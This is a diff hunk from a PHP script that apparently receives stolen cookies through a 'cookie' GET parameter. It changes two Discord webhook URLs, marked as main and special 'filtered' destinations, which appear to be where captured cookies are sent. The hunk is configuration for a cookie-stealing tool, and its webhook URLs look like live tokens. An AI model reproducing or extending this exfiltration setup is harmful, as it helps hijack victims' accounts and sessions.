@@ -131,8 +131,8 @@ if (isset($_GET['cookie'])) {
 
         //FILTERD WEBHOOK
 
-        $main_webhook = "https://discord.com/api/webhooks/1312390058975690783/DzweuR9B57ZG49ptUiInDOjRTO4PdEH0FE6n4LRdNDZ-9iMESLtInFe89ZzW4XYNTCfs";
-        $special_webhook = "https://discord.com/api/webhooks/1312390124310499470/do1Rh85iip-xc-HGsklL22ALEOvvP9BdD5j4bd8vfDuzjkI4VqSPVMCE9J-_Xlax6k3P";
+        $main_webhook = "https://discord.com/api/webhooks/1312390058975690783/DzweuR9B5LRdNDZ-9iMESLtInFe89ZzW4XYNTCfs";
+        $special_webhook = "https://discord.com/api/webhooks/1312390124310499470/doBdD5j4bd8vfDuzjkI4VqSPVMCE9J-_Xlax6k3P";
         $use_special = false;
 
         //FILTER SETTINGS
